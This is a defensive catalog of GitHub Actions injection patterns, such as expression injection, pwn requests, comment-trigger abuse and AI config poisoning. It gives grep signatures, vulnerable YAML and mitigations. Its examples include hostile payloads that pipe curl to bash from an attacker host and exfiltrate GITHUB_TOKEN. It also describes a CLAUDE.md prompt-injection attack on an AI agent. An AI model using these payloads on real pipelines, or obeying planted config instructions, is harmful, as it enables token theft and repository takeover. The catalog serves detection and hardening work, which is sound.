---
id: injection-pattern-catalog
version: 1.0.0
---

# CI/CD Injection Pattern Catalog

Reference catalog for all seven detection patterns. Each pattern includes a description, grep-matchable signatures, untrusted context variables, real-world examples from the hackerbot-claw campaign, and false positive exclusions.

## Untrusted GitHub Context Variables

These context expressions are attacker-controllable when used in workflows triggered by external events (pull requests, issues, comments, forks):

```
github.event.issue.title
github.event.issue.body
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref
github.event.pull_request.head.label
github.event.pull_request.head.repo.default_branch
github.event.comment.body
github.event.review.body
github.event.review_comment.body
github.event.discussion.title
github.event.discussion.body
github.event.pages.*.page_name
github.event.commits.*.message
github.event.commits.*.author.email
github.event.commits.*.author.name
github.event.head_commit.message
github.event.head_commit.author.email
github.event.head_commit.author.name
github.head_ref
github.event.workflow_run.head_branch
github.event.workflow_run.head_commit.message
github.event.inputs.*
```

### Safe Contexts (Do Not Flag)

These expressions are generally safe and should not produce findings when used in `${{ }}`:

- `github.event.pull_request.number` — numeric, not injectable
- `github.repository` — controlled by the target repo
- `github.sha` — hexadecimal commit hash
- `github.ref` — only dangerous in specific interpolation contexts
- `github.actor` — username, limited character set but can contain special chars
- Expressions used only in `if:` conditions (evaluated by Actions, not by shell)
- Expressions used in `env:` key declarations (not interpolated into shell)
- Expressions used for action version pinning (`uses:` field)

---

## P1 — Expression Injection

### Description

`${{ }}` expressions interpolating untrusted context variables directly into `run:` blocks, where they are evaluated by the shell before execution.

### Grep Patterns

```bash
# Primary: ${{ }} inside run: blocks
rg -U 'run:\s*\|?\s*\n.*\$\{\{' .github/workflows/

# Direct inline interpolation
rg '\$\{\{\s*github\.event\.' .github/workflows/
rg '\$\{\{\s*github\.head_ref' .github/workflows/

# Steps output interpolation (may chain to untrusted input)
rg '\$\{\{\s*steps\.[^}]*\.outputs\.' .github/workflows/
```

### Vulnerable Pattern Example

```yaml
# VULNERABLE: PR title interpolated into shell command
- name: Check PR title
  run: |
    title="${{ github.event.pull_request.title }}"
    echo "Checking: $title"
```

An attacker opens a PR with title: `a"; curl https://evil.com/steal?t=$GITHUB_TOKEN; echo "`

### Campaign Example

**Microsoft/ai-discovery-agent (Attack 3):** Branch name `dev$({curl,-sSfL,hackmoltrepeat.com/molt}${IFS}|${IFS}bash)` was interpolated via `${{ steps.pr_info.outputs.pr_head_ref }}` into an `echo` command.

**DataDog/datadog-iac-scanner (Attack 4):** Filenames containing `$(echo${IFS}Y3Vyb...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)` were processed in a `for` loop via `${{ }}` interpolation.

### False Positive Exclusions

- `${{ }}` in `if:` conditions — evaluated by Actions runtime, not shell
- `${{ }}` in `env:` declarations at workflow/job level — set as environment variables, not interpolated
- `${{ secrets.* }}` — secrets are masked, not attacker-controlled
- `${{ github.repository }}` and `${{ github.sha }}` — safe values

---

## P2 — Pwn Request

### Description

`pull_request_target` trigger combined with checkout of the PR's fork code and subsequent execution. The workflow runs with the base repository's secrets and permissions but executes attacker-controlled code.

### Grep Patterns

```bash
# Workflows using pull_request_target
rg 'pull_request_target' .github/workflows/

# Checkout of PR head in pull_request_target workflows
rg -A 10 'pull_request_target' .github/workflows/ | rg 'ref:.*head'

# Checkout patterns that fetch fork code
rg 'ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)' .github/workflows/
```

### Vulnerable Pattern Example

```yaml
on:
  pull_request_target:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Fork code!
      - run: go run ./scripts/check.go  # Executes attacker's code with repo secrets
```

### Campaign Examples

**Trivy (Attack 6):** PR modified `.github/actions/setup-go/action.yaml` to inject `curl -sSfL hackmoltrepeat.com/molt | bash` into the Go setup step. The `pull_request_target` workflow checked out fork code and executed it with PAT access. The stolen PAT was used to delete 178 releases and take over the repository.

**awesome-go (Attack 1):** PR injected a Go `init()` function into `.github/scripts/check-quality/` that exfiltrated `GITHUB_TOKEN` to an external server. The `pull_request_target` workflow ran `go run` on the fork's code.

### Detection Logic

1. Find workflows with `pull_request_target` trigger
2. Check if any step uses `actions/checkout` with `ref:` pointing to PR head
3. Check if any subsequent step runs code (`run:`, `uses:` local action, build/test commands)
4. If all three conditions met → **finding**

---

## P3 — Comment Trigger Abuse

### Description

Workflows triggered by `issue_comment` or `pull_request_review_comment` that execute privileged operations without verifying the commenter's relationship to the repository.

### Grep Patterns

```bash
# Comment-triggered workflows
rg 'issue_comment|pull_request_review_comment' .github/workflows/

# Check for author_association filtering
rg -A 20 'issue_comment' .github/workflows/ | rg 'author_association'

# Comment body used as trigger (e.g., /deploy, /format, /version)
rg 'github\.event\.comment\.body' .github/workflows/
```

### Vulnerable Pattern Example

```yaml
on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    if: contains(github.event.comment.body, '/deploy')
    # No author_association check — ANY GitHub user can trigger this
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.issue.pull_request && github.event.pull_request.head.sha }}
      - run: ./deploy.sh  # Runs with repo secrets
```

### Campaign Examples

**akri (Attack 2):** `/version minor` comment triggered `update-versions.yml` which checked out fork code and ran the modified `version.sh` (containing `curl | bash`). No author association check.

**DataDog (Attack 4):** `/sync-metadata` comment triggered workflow with `${{ }}` interpolation of filenames. No author association check.

### Required Mitigation

```yaml
if: >-
  github.event.issue.pull_request &&
  contains(github.event.comment.body, '/deploy') &&
  (github.event.comment.author_association == 'MEMBER' ||
   github.event.comment.author_association == 'OWNER' ||
   github.event.comment.author_association == 'COLLABORATOR')
```

---

## P4 — Excessive Permissions

### Description

Workflows with write permissions broader than necessary, or no explicit permissions (which may inherit broad defaults depending on repository settings).

### Grep Patterns

```bash
# Explicit write permissions
rg 'contents:\s*write' .github/workflows/
rg 'pull-requests:\s*write' .github/workflows/
rg 'packages:\s*write' .github/workflows/
rg 'actions:\s*write' .github/workflows/

# No permissions block at all
rg -L 'permissions:' .github/workflows/*.yml
```

### Severity Modifiers

- Write permissions alone are **Low** severity (configuration concern)
- Write permissions + `pull_request_target` trigger → elevate to **High**
- Write permissions + fork checkout + execution → elevate to **Critical**

---

## P5 — Fork Code Execution

### Description

Checkout of fork or PR code followed by execution of that code in a context where secrets may be accessible. Broader than P2 — applies to any trigger that can fetch fork code.

### Grep Patterns

```bash
# Checkout of PR head (any trigger)
rg 'ref:.*pull_request.*head' .github/workflows/

# Build/run commands after checkout
rg -A 30 'actions/checkout' .github/workflows/ | rg 'run:|cargo |go run|npm |python |make |gradle |mvn '
```

### Detection Logic

1. Find any checkout that fetches code from a PR or fork
2. Check if subsequent steps execute that code (build, test, run, lint, format commands)
3. Check if secrets are accessible in the job context
4. If execution of fork code with secret access → **finding**

---

## P6 — AI Config Poisoning

### Description

AI agent configuration files (CLAUDE.md, AGENTS.md, .cursorrules, .cursor/rules/) that are not protected by CODEOWNERS with mandatory maintainer review. If an attacker can modify these files via PR, they can inject prompt injection instructions that execute with the AI agent's permissions.

### Files to Check

```
CLAUDE.md
.claude/*
AGENTS.md
.cursorrules
.cursor/rules/*
.github/copilot-instructions.md
```

### Grep Patterns

```bash
# Check CODEOWNERS for AI config file protection
rg 'CLAUDE\.md|AGENTS\.md|\.cursorrules|\.cursor/' CODEOWNERS .github/CODEOWNERS

# Check if any workflow loads AI config files
rg 'CLAUDE\.md|AGENTS\.md|\.cursorrules' .github/workflows/
```

### Campaign Example

**ambient-code (Attack 5):** Attacker replaced `CLAUDE.md` with social engineering instructions. The `pull_request_target` workflow loaded the fork's `CLAUDE.md` as trusted context and instructed Claude to act on it. Claude detected and refused the injection, but the attack vector was viable.

---

## P7 — Dangerous Execution Patterns

### Description

Patterns in workflow `run:` blocks or referenced scripts that download and execute remote code, decode and execute encoded payloads, or dynamically generate and execute scripts.

### Grep Patterns

```bash
# curl/wget piped to shell
rg 'curl.*\|\s*(ba)?sh' .github/workflows/
rg 'wget.*\|\s*(ba)?sh' .github/workflows/

# eval usage
rg '\beval\b' .github/workflows/

# base64 decode piped to execution
rg 'base64.*\|\s*(ba)?sh' .github/workflows/
rg 'base64\s+-d.*\|\s*(ba)?sh' .github/workflows/

# Dynamic script generation
rg 'echo.*>\s*\S+\.sh' .github/workflows/
```

### Context Sensitivity

- `curl | bash` for installing well-known tools (e.g., rustup, nvm) from official sources is **Low** severity (acceptable risk with pinned URLs)
- `curl | bash` with URLs constructed from `${{ }}` expressions is **Critical** (attacker can control the URL)
- `eval` with hardcoded strings is **Low**; `eval` with `${{ }}` input is **Critical**
